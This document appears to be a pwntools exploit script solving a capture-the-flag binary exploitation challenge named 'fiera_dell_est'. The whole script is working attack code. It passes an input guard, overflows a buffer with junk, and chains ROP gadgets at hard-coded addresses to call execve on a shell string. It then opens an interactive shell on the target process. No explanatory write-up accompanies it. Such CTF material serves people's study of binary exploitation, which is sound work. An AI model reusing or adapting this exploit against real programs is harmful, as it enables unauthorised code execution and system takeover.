from pwn import *

exe = ELF('./fiera_dell_est')
context.binary = exe

io = exe.process()

execve_opcode = p32(0x0b)

pop_eax_ret = p32(0x0804851d)
pop_ebx_ret = p32(0x08048399)
pop_ecx_ret = p32(0x0804852b)
pop_edx_ret = p32(0x08048528)
syscall = p32(0x0804852d)

shell_string_addr = p32(0x804a02c)
null_string_addr = p32(0x804a033)


payload = b'due\x00'		    # pass if guard
payload += b'AAAABBBBCCCC'	    # junk
payload += pop_eax_ret		    # eip gets overriden
payload += execve_opcode  	    # loads opcode in eax
payload += pop_ebx_ret          # pop program name in ebx
payload += shell_string_addr    # shell as program name
payload += pop_ecx_ret          # pop program args
payload += null_string_addr     # program args
payload += pop_edx_ret          # pop env arg
payload += b'\x00\x00\x00\x00'  # env arg
payload += syscall              # fire syscall

io.sendline(payload)
io.interactive()

